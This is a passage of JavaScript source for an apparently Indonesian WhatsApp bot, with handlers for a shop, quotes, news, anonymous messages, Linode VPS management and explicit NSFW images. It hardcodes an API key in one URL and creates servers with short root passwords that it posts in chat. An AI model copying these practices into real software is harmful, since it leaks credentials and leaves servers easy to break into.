const product = products.find(p => p.nama.toLowerCase() === productName.toLowerCase())
if (!product) {
reply(`Produk "${productName}" tidak ditemukan.`)
} else {
addDisczz(productName, discountPrice, expirationDate)
const discountPercentage = persenDiskonnya(product.harga, discountPrice)
reply(`Diskon untuk produk "${productName}" berhasil ditambahkan.\nHarga diskon: Rp${discountPrice}, Berlaku hingga: ${expirationDate} (${discountPercentage}%)`)
}}}
break

case 'restok': {

if (!text.includes(',')) return reply(`Contoh: ${cmd} nama_produk, jumlah_stok`)
const [productName, stockStr] = args.join(' ').split(',').map(item => item.trim())
const jumlahStok = parseInt(stockStr, 10)
if (!productName || isNaN(jumlahStok) || jumlahStok <= 0) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk dan jumlah stok yang valid.')
} else {
const restockedProduct = ngerestokk(productName, jumlahStok)
if (restockedProduct) {
reply(`Stok produk "${restockedProduct.nama}" telah ditambahkan. Stok saat ini: ${restockedProduct.stok} unit.`)
} else {
reply(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'beliproduk': {

if (!text.includes(',')) return reply(`Contoh: ${cmd} nama_produk, jumlah`)
const [productName, quantity] = args.join(' ').split(',').map(item => item.trim())
const jumlah = parseInt(quantity, 10)
if (!productName || isNaN(jumlah) || jumlah <= 0) {
return reply('Format tidak valid. Pastikan untuk memasukkan nama produk dan jumlah yang valid.')
}
const products = getprodukDariFile();
const product = products.find(p => p.nama.toLowerCase() === productName.toLowerCase())

if (!product) {
return reply(`Produk "${productName}" tidak ditemukan.`)}
if (product.stok < jumlah) {
return reply(`Stok untuk produk "${productName}" tidak mencukupi. Tersisa ${product.stok} unit.`)}
const discounts = getDisczz()
const discount = discounts.find(d => d.produk.toLowerCase() === product.nama.toLowerCase())
const totalHarga = discount ? discount.harga_diskon * jumlah : product.harga * jumlah
const transactionId = cIdTrnya()
reply(`
Kamu membeli ${jumlah} produk "${productName}"
Total harga: ${toRupiah(totalHarga)}

Silahkan transfer terlebih dahulu lalu
ketik .payment untuk melihat metode pembayaran yang tersedia

Ketik ini...
.confirm ${transactionId}
.cancel ${transactionId}
`)
saveTrnye({
id: transactionId,
productName,
jumlah,
totalHarga,
status: 'process',
buyer: m.sender
})
product.stok -= jumlah
simpenProduknya(products)
}
break

case 'confirm': {

const transactionId = text.trim().split(' ')[0]
if (!transactionId) return reply(`Contoh: ${cmd} id_transaksi`)
const transaction = getTrId(transactionId)
if (!transaction) {
return reply(`Transaksi dengan ID "${transactionId}" tidak ditemukan.`)
 }
if (transaction.status !== 'process') {
return reply('ID transaksi tidak valid atau tidak dalam status menunggu bukti transfer.')
}
transaction.status = 'success'
simpenSmTr(getSmTr().map(t => t.id === transactionId ? transaction : t))
reply(`Transaksi dengan ID "${transactionId}" telah berhasil dikonfirmasi.`)
}
break

case 'kensel': {

const transactionId = text.trim().split(' ')[0]
if (!transactionId) return reply(`Contoh: ${cmd} id_transaksi`)
const transaction = getTrId(transactionId)
if (!transaction) {
return reply(`Transaksi dengan ID "${transactionId}" tidak ditemukan`)
}
if (transaction.status !== 'process') {
return reply('ID transaksi tidak valid atau tidak dalam status menunggu bukti transfer')
}

const products = getprodukDariFile()
const product = products.find(p => p.nama.toLowerCase() === transaction.productName.toLowerCase())
if (product) {
product.stok += transaction.jumlah
simpenProduknya(products)
}
transaction.status = 'canceled'
simpenSmTr(getSmTr().map(t => t.id === transactionId ? transaction : t))
reply(`Transaksi dengan ID "${transactionId}" telah dibatalkan`)
}
break
  
// ============QUOTES ////////*////////**/*)/
case 'dilan':
    case 'quotesdilan': {

let tod = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotesdilan.json`)
      const dilan = await pickRandom(tod)
      sock.sendMessage(m.chat, {
        text: dilan.quotes
      }, {
        quoted: fakeQuoted
      })
    }
    break
    case 'bucin':
    case 'quotesbucin': {

const bucin = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/bucin.json`)
      const bucc = await pickRandom(bucin)
      sock.sendMessage(m.chat, {
        text: bucc
      }, {
        quoted: fakeQuoted
      })
    }
    break
    case 'quotesanime': {

const quotesanim = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotesanime.json`)
      const anu = await pickRandom(quotesanim)
      let teks = `*Quotes Anime*\n\n"${anu.quotes}"\n\n*${anu.char_name}*\n_${anu.anime} (${anu.episode})_\n_${anu.date}_`
      let coo = `{\"display_text\":\"Url Quotes\",\"id\":\"P\",\"copy_code\":\"${anu.url}\"}`
      m.reply(m.chat, teks, coo, null, m)
    }
    break
    case 'quotesislamic': {

const islamic = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotesislamic.json`)
      const quotesislamic = await pickRandom(islamic)
      m.reply(`${quotesislamic}`)
    }
    break
    case 'faktaunik': {

const fakta = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/faktaunik.json`)
      const faktaunik = await pickRandom(fakta)
      m.reply(`*Taukah Kamu?*\n\n${faktaunik}`)
    }
    break
    case 'katasenja': {

const senja = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/katasenja.json`)
      const katasenja = await pickRandom(senja)
      m.reply(`${katasenja}`)
    }
    break
    case 'katailham': {

const ilham = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/katailham.json`)
      const katailham = await pickRandom(ilham)
      m.reply(`${katailham}`)
    }
    break
    case 'quotes': {

const quot = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotes.json`)
      const quote = await pickRandom(quot)
      m.reply(`${quote.quotes}\n\nBy ${quote.author}`)
    }
    break
    case 'puisi': {

const puis = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/puisi.json`)
      const puisi = await pickRandom(puis)
      m.reply(`${puisi}`)
    }
    break
    case 'pantun': {

const pant = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/pantun.json`)
      const pantun = await pickRandom(pant)
      m.reply(`${pantun}`)
    }
    break
    case 'motivasi': {

const motiv = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/motivasi.json`)
      const motivasi = await pickRandom(motiv)
      m.reply(`${motivasi}`)
    }
    break
    /* MENFESS */
    case"confes": case "menfes":case 'menfess': case 'confess': {

if (!isPrivate) return reply(`Khusus Di Private Chat!!`)
      global.menfess = global.menfess ? global.menfess : {}
      if (!text) return reply(` ${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
      let [jid, name, msg] = text.split`|`
      if ((!jid || !name || !msg)) return reply(`${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
      let p = (await sock.onWhatsApp(jid))[0] || {}
      if (!p.exists) return reply('❌ Nomer Yang Kamu Masukan Salah')
      if (p.jid == m.sender) return reply('Itu Nomer Lu Dodol!!')
      let mf = Object.values(global.menfess).find(mf => mf.status === true)
      if (mf) return !0
         let heri = `${monospa(`${name.trim()}`)}`
         let id = +new Date
         let txt = `📨 Hay kamu dapat pesan dari seseorang 👋 \n\nnama: *${name.trim()}*\n\nPesan: `
         txt += `_${msg.trim()}_\n\n${readmore}Mau balas pesan ini kak? bisa kok kak. tinggal ketik pesannya kakak lalu kirim, nanti saya sampaikan ke ${heri}`
         
             await sock.sendMessage(p.jid, {
    text: txt,
    contextInfo: {
      externalAdReply: {
        title: 'Confess',
        body: '',
        thumbnailUrl: 'https://telegra.ph/file/5413eed27c6af00fa7273.jpg',
        sourceUrl: null,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }).then(() => {
 m.reply(`*Berhasil Mengirim Pesan Menfess!!*`)       
            global.menfess[id] = {
               id,
               from: m.sender,
               name,
               receiver: p.jid,
               msg,
               status: false
            }
            return !0
         })
   }
break
/* BERITA */ 
case "antara": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/antara")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image
const category = firstNews.category
const artikel = firstNews.type
const teks = `
*ANTARA*
- ${title}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: `ANTARA`,
serverId: 200
}, 
externalAdReply: {
title: `antara • `+artikel, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: null })
}
break
case "cnbc":
case "cnbcindonesia": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/cnbcindonesia")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image
const category = firstNews.category
const date = firstNews.date
const teks = `
*CNBC*
- ${title}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: `cnbc • `+date, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: null })
}
break
case "cnn":
case "cnnindonesia": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/cnn")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image_full
const content = firstNews.content
const date = firstNews.time
const teks = `
*CNN*
- ${title}
- ${content}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: `cnn • `+date, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: null })
}
break
case "kompasIndonesia":
case "kompas": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/kompas")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image
const category = firstNews.category
const artikel = firstNews.date
const teks = `
*KOMPAS*
- ${title}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: `ANTARA`,
serverId: 200
}, 
externalAdReply: {
title: `kompas • `+artikel, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: null })
}
break
case "merdeka":
case "merdekaindonesia": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/merdeka")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image
const content = firstNews.description
const date = firstNews.date
const teks = `
*MERDEKA*
- ${title}
- ${content}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: `merdeka • `+date, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: null })
}
break
case "sindonews":
case "sindonewsindonesia": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/sindonews")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.imageUrl
const category = firstNews.category
const date = firstNews.timestamp
const teks = `
*SINDONEWS*
- ${title}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: `sindonews • `+date, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: null })
}
break
case "suara":
case "suaraindonesia": {

const api = await fetchJson("https://api.siputzx.my.id/api/berita/suara")
const firstNews = api.data[0] // Ambil berita pertama dari array
const title = firstNews.title
const link = firstNews.link
const image = firstNews.image
const category = firstNews.category
const date = firstNews.date
const teks = `
*SUARA*
- ${title}
- ${link}
`
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: `suara • `+date, 
thumbnailUrl: image, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: link, 
}}
}, {quoted: null })
}
break
/* RANDOM */
case "randombluearchiver":
case "bluearchiver": {
if (!isPremium) return m.reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/blue-archive";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomchina":
case "china": {
if (!isPremium) return m.reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/china";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomindo":
case "indo": {
if (!isPremium) return m.reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/indonesia";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomwaifu":
case "waifu": {
if (!isPremium) return m.reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/waifu";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomneko":
case "neko": {
if (!isPremium) return m.reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/neko";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomvietnam":
case "vietnam": {
if (!isPremium) return m.reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/vietnam";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomthailand":
case "thailand": {
if (!isPremium) return m.reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/thailand";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomkorea":
case "korea": {
if (!isPremium) return m.reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/korea";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
case "randomjapan":
case "japan": {
if (!isPremium) return m.reply(mess.prem)

    const data = "https://api.siputzx.my.id/api/r/cecan/japan";
    await sock.sendMessage(m.chat, {
        image: { url: data },
        caption: ""
    }, { quoted: fakeQuoted });
}
break;
/* LINODE */
case 'linode2gb': {
      if (!isOwner) return reply(mess.owner)
      try {
        let linodeData = {
          label: `${args[0]}`,
          region: 'ap-south',
          type: 'g6-standard-1',
          image: 'linode/ubuntu20.04',
          root_pass: randomKarakter(5) + randomNomor(3),
          stackscript_id: null,
          authorized_keys: null,
          backups_enabled: false
        };

        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          },
          body: JSON.stringify(linodeData)
        });

        const responseData = await response.json();

        if (response.ok) {
          const linodeId = responseData.id;
          m.reply(`Tunggu Sebentar...`);
          await new Promise(resolve => setTimeout(resolve, 60000));

          const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${linodeToken}`
            }
          });

          const linodeInfo = await linodeResponse.json();
          const ipAddress = linodeInfo.ipv4[0];

          let messageText = `Linode berhasil dibuat!\n\n`;
          messageText += `ID: ${linodeId}\n`;
          messageText += `IP Linode: ${ipAddress}\n`;
          messageText += `Password: ${linodeData.root_pass}\n`;

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
      }
    }
    break

    case 'linode4gb': {
      if (!isOwner) return reply(mess.owner)
      try {
        let linodeData = {
          label: `${args[0]}`,
          region: 'ap-south',
          type: 'g6-standard-2',
          image: 'linode/ubuntu20.04',
          root_pass: randomKarakter(5) + randomNomor(3),
          stackscript_id: null,
          authorized_keys: null,
          backups_enabled: false
        };

        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          },
          body: JSON.stringify(linodeData)
        });

        const responseData = await response.json();

        if (response.ok) {
          const linodeId = responseData.id;
          m.reply(`Tunggu Sebentar...`);
          await new Promise(resolve => setTimeout(resolve, 60000));

          const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${linodeToken}`
            }
          });

          const linodeInfo = await linodeResponse.json();
          const ipAddress = linodeInfo.ipv4[0];

          let messageText = `Linode berhasil dibuat!\n\n`;
          messageText += `ID: ${linodeId}\n`;
          messageText += `IP Linode: ${ipAddress}\n`;
          messageText += `Password: ${linodeData.root_pass}\n`;

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
      }
    }
    break

    case 'linode8gb': {
      if (!isOwner) return reply(mess.owner)
      try {
        let linodeData = {
          label: `${args[0]}`,
          region: 'ap-south',
          type: 'g6-standard-4',
          image: 'linode/ubuntu20.04',
          root_pass: randomKarakter(5) + randomNomor(3),
          stackscript_id: null,
          authorized_keys: null,
          backups_enabled: false
        };

        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          },
          body: JSON.stringify(linodeData)
        });

        const responseData = await response.json();

        if (response.ok) {
          const linodeId = responseData.id;
          m.reply(`Tunggu Sebentar...`);
          await new Promise(resolve => setTimeout(resolve, 60000));

          const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${linodeToken}`
            }
          });

          const linodeInfo = await linodeResponse.json();
          const ipAddress = linodeInfo.ipv4[0];

          let messageText = `Linode berhasil dibuat!\n\n`;
          messageText += `ID: ${linodeId}\n`;
          messageText += `IP Linode: ${ipAddress}\n`;
          messageText += `Password: ${linodeData.root_pass}\n`;

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
      }
    }
    break

    case 'linode16gb': {
      if (!isOwner) return reply(mess.owner)
      try {
        let linodeData = {
          label: `${args[0]}`,
          region: 'ap-south',
          type: 'g6-standard-8',
          image: 'linode/ubuntu20.04',
          root_pass: randomKarakter(5) + randomNomor(3),
          stackscript_id: null,
          authorized_keys: null,
          backups_enabled: false
        };

        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          },
          body: JSON.stringify(linodeData)
        });

        const responseData = await response.json();

        if (response.ok) {
          const linodeId = responseData.id;
          m.reply(`Tunggu Sebentar...`);
          await new Promise(resolve => setTimeout(resolve, 60000));

          const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${linodeToken}`
            }
          });

          const linodeInfo = await linodeResponse.json();
          const ipAddress = linodeInfo.ipv4[0];

          let messageText = `Linode berhasil dibuat!\n\n`;
          messageText += `ID: ${linodeId}\n`;
          messageText += `IP Linode: ${ipAddress}\n`;
          messageText += `Password: ${linodeData.root_pass}\n`;

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
      }
    }
    break

    case 'listlinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        const responseData = await response.json();

        if (response.ok) {
          let messageText = 'Daftar Linode VPS:\n\n';
          responseData.data.forEach(linode => {
            messageText += `ID: ${linode.id}\n`;
            messageText += `Label: ${linode.label}\n`;
            messageText += `IP: ${linode.ipv4[0]}\n\n`;
          });

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal mendapatkan daftar Linode.`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat mendapatkan daftar Linode: ${err}`);
      }
    }
    break

    case 'onlinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/boot`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        if (response.ok) {
          m.reply(`Linode dengan ID ${linodeId} berhasil dihidupkan.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal menghidupkan Linode: ${responseData.errors[0]?.reason || 'Unknown Error'}`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat menghidupkan Linode: ${err}`);
      }
    }
    break

    case 'offlinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        if (response.ok) {
          m.reply(`Linode dengan ID ${linodeId} berhasil dimatikan.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal mematikan Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat mematikan Linode: ${err}`);
      }
    }
    break

    case 'rebootlinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/reboot`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        if (response.ok) {
          m.reply(`Linode dengan ID ${linodeId} berhasil di-restart.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal me-restart Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat me-restart Linode: ${err}`);
      }
    }
    break

    case 'rebuildlinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const image = args[1];
        const rootPassword = randomKarakter(4) + randomNomor(3);

        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          },
          body: JSON.stringify({
            image,
            root_pass: rootPassword
          })
        });

        if (response.ok) {
          m.reply(`Linode dengan ID ${linodeId} berhasil di-rebuild dengan image ${image}. Password root baru: ${rootPassword}`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal rebuild Linode: ${responseData.errors[0]?.reason || 'Unknown Error'}`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat rebuild Linode: ${err}`);
      }
    }
    break

    case 'delinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'DELETE',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        if (response.ok) {
          m.reply(`Linode dengan ID ${linodeId} berhasil dihapus.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal menghapus Linode: ${responseData.errors[0].reason}`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat menghapus Linode: ${err}`);
      }
    }
    break

    case 'saldolinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const response = await fetch('https://api.linode.com/v4/account', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        const accountInfo = await response.json();

        if (response.ok) {
          const balance = accountInfo.balance / 100;
          const credit = accountInfo.credit_remaining / 100;

          let messageText = `Saldo Akun Linode:\n\n`;
          messageText += `- Balance: $${balance.toFixed(2)}\n`;
          messageText += `- Credit Remaining: $${credit.toFixed(2)}\n`;

          m.reply(messageText);
        } else {
          throw new Error(`Gagal mendapatkan saldo Linode.`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat memeriksa saldo Linode: ${err}`);
      }
    }
    break

    case 'sisalinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        const responseData = await response.json();

        if (response.ok) {
          const totalLinodes = responseData.data.length;
          m.reply(`Total Linode yang aktif: ${totalLinodes}`);
        } else {
          throw new Error(`Gagal mendapatkan data Linode.`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat memeriksa jumlah Linode: ${err}`);
      }
    }
    break

    case 'cekvpslinode': {
      if (!isOwner) return reply(mess.owner)
      try {
        const linodeId = args[0];
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${linodeToken}`
          }
        });

        const linodeInfo = await response.json();

        if (response.ok) {
          let messageText = `Detail Linode:\n\n`;
          messageText += `ID: ${linodeInfo.id}\n`;
          messageText += `Label: ${linodeInfo.label}\n`;
          messageText += `Status: ${linodeInfo.status}\n`;
          messageText += `Region: ${linodeInfo.region}\n`;
          messageText += `Type: ${linodeInfo.type}\n`;
          messageText += `IP: ${linodeInfo.ipv4.join(', ')}\n`;

          await sock.sendMessage(m.chat, {
            text: messageText
          }, {
            quoted: fakeQuoted
          });
        } else {
          throw new Error(`Gagal mendapatkan detail Linode.`);
        }
      } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat memeriksa detail Linode: ${err}`);
      }
    }
    break
// ============Nsfw
    case 'waifu':
    case 'neko':
    case 'shinobu':
    case 'megumin':
    case 'bully':
    case 'cuddle':
    case 'cry':
    case 'hug':
    case 'awoo':
    case 'kiss':
    case 'lick':
    case 'pat':
    case 'smug':
    case 'bonk':
    case 'yeet':
    case 'blush':
    case 'smile':
    case 'wave':
    case 'highfive':
    case 'handhold':
    case 'nom':
    case 'bite':
    case 'glomp':
    case 'slap':
    case 'kill':
    case 'happy':
    case 'wink':
    case 'poke':
    case 'dance':
    case 'cringe':
    case 'trap':
    case 'blowjob':
    case 'hentai':
    case 'boobs':
    case 'ass':
    case 'pussy':
    case 'thighs':
    case 'lesbian':
    case 'lewdneko':
    case 'cum': {
      if (!isOwner && !isPremium) return reply(mess.prem)
      m.reply("Loading 🔁")
        const haha = `https://api.zeeoneofc.my.id/api/nsfw/${command}?apikey=QIO8xicLNkEV43Y`
          sock.sendMessage(m.chat, {
            image: {
              url: haha
            },
            caption: name
          }, {
            quoted: null
          })
    break
    }
    // ============Genshin
    case 'genshin-wildlife':
    case 'g-wildlife':
    case 'gens-wildlife': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} snowboar*\nHarap berikan nama binatang liar.`);
      try {
        let result = await genshindb.wildlife(text);
        if (result) {
          let response = `*Binatang Liar Ditemukan: ${result.name}*\n\n` + `_${result.description || "Data tidak tersedia"}_\n\n` + `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n` + `*Habitat:* ${result.habitat || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Binatang liar tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.wildlife("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Binatang liar yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-weapons':
    case 'g-weapons':
    case 'gens-weapons': {
      
      if (!text) return m.reply(`Contoh: *${lrefix + command} claymore*\nHarap berikan nama senjata.`);
      try {
        let result = await genshindb.weapons(text);
        if (result) {
